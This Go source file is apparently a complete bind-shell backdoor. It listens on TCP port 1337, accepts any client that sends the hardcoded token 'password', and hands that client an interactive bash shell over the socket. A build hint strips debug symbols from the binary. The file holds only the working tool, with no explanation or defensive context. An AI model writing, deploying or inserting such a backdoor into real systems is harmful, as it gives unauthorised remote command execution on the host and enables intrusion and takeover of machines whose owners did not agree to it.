package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"os/exec"
)

// go build -ldflags="-s -w"

var token = []byte("password\n")

func run(conn net.Conn) {
	cmd := exec.Command("/bin/bash", "-i")

	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	err := cmd.Start()
	if err != nil {
		log.Printf("Error starting the process: %v\n", err)
		return
	}

	cmd.Wait()
	log.Printf("Connection closed: %v\n", conn.RemoteAddr())
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	buff := make([]byte, 1024)
	r, err := conn.Read(buff)
	if err != nil {
		log.Printf("Error reading from connection: %v\n", err)
		return
	}

	if r != len(token) {
		log.Printf("Invalid token length %v\n", r)
		return
	}

	for i, b := range token {
		if buff[i] != b {
			log.Printf("Invalid %v byte: %v != %v\n", i, buff[i], b)
			return
		}
	}

	run(conn)
}

func main() {
	var (
		port int
		h    bool
		help bool
	)

	flag.IntVar(&port, "port", 1337, "port to listen on")
	flag.BoolVar(&h, "h", false, "print help")
	flag.BoolVar(&help, "help", false, "print help")
	flag.Parse()

	if h || help {
		flag.PrintDefaults()
		return
	}

	addr, err := net.ResolveTCPAddr("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		log.Fatalf("Error resolving tcp addr: %v\n", err)
	}

	ln, err := net.ListenTCP("tcp", addr)
	if err != nil {
		log.Fatalf("Error listening on %+v: %v\n", addr, err)
	}

	log.Printf("Listening on: %+v\n", addr)
	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("Error accepting connection: %v\n", err)
			continue
		}
		log.Printf("Connected: %v\n", conn.RemoteAddr())
		go handleConnection(conn)
	}
}
